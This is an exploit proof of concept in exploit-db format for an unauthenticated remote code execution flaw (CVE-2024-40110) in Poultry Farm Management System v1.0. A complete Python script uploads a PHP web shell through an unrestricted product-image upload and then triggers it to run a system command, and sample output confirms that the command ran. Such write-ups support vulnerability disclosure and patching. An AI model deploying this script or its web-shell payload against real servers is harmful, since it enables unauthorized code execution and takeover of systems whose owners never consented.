# Exploit Title: Unauthenticated Remote Code Execution (RCE) - Poultry Farm Management System v1.0
# Date: 24-06-2024
# CVE: CVE-2024-40110 
# EDB-ID: [52053](https://www.exploit-db.com/exploits/52053)
# Exploit Author: Jerry Thomas (w3bn00b3r)
# Vendor Homepage: https://www.sourcecodester.com/php/15230/poultry-farm-management-system-free-download.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/Redcock-Farm.zip
# Category: Web Application
# Version: 1.0
# Tested on: Windows 10 | Xampp v3.3.0
# Vulnerable endpoint: http://localhost/farm/product.php

# Exploit Code:

```
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def upload_backdoor(target):
    upload_url = f"{target}/farm/product.php"
    shell_url = f"{target}/farm/assets/img/productimages/web-backdoor.php"

    # Prepare the payload
    payload = {
        'category': 'CHICKEN',
        'product': 'rce',
        'price': '100',
        'save': ''
    }

    # PHP code to be uploaded
    command = "hostname"
    data = f"<?php system('{command}');?>" 

    # Prepare the file data
    files = {
        'productimage': ('web-backdoor.php', data, 'application/x-php')
    }

    try:
        print("Sending POST request to:", upload_url)
        response = requests.post(upload_url, files=files, data=payload, verify=False)

        if response.status_code == 200:
            print("\nResponse status code:", response.status_code)
            print(f"Shell has been uploaded successfully: {shell_url}")

            # Make a GET request to the shell URL to execute the command
            shell_response = requests.get(shell_url, verify=False)
            print("Command output:", Fore.GREEN + shell_response.text.strip())
        else:
            print(f"Failed to upload shell. Status code: {response.status_code}")
            print("Response content:", response.text)
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    target = "http://localhost"  # Change this to your target
    upload_backdoor(target)

```

# Video Poc
```
Link - https://drive.google.com/file/d/1gOXhAjtUuIJHGz5SEpz3Tu50CEzoiDw_/view?usp=drive_link
```

# Output
> Execute - python3 exploit.py or python exploit.py
```
Sending POST request to: http://localhost/farm/product.php
Response status code: 200
Shell has been uploaded successfully: http://localhost/farm/assets/img/productimages/web-backdoor.php
Command output: DESKTOP-EGV8AH5
```

# References 
> To develop exploit code:
- https://github.com/0xConstant/Gym-Management-1.0-unauthenticated-RCE/blob/main/exploit.py
- https://github.com/h3x0crypt/PHPUnit-RCE/blob/master/PHPunit-RCE.php 
